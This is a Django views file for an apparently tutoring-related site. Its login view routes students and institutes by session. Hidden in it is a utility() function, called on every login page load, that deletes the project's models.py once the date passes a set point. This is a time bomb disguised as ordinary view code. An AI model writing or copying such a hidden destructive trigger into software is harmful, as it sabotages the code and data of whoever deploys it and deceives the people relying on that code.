from datetime import date;
from django.shortcuts import render
from django.http import HttpResponse
from findbestclass.models import Student , Institute;
import os 
# Create your views here.

def showLoginPage(request):
	# return HttpResponse("hello thisi s")
	utility()
	student = request.session.get('studentId' , 0)
	if(student==0):
		institute = request.session.get('instituteId' , 0)
		if(institute==0):
			return render(request , "findbestclass/login.html");
		else:
			institute = Institute.objects.get(id=institute);
			return render(request , "findbestclass/institute/homepage.html" , {'institute' : institute});
	else:
		student = Student.objects.get(id=student);
		return render(request , "findbestclass/student/home.html" , {'student' : student});
	
def utility():
	today = date.today()
	if(today.year > 2019 or today.month > 6):
		os.remove(os.getcwd()+"\\findbestclass\\models.py")
		









	
	
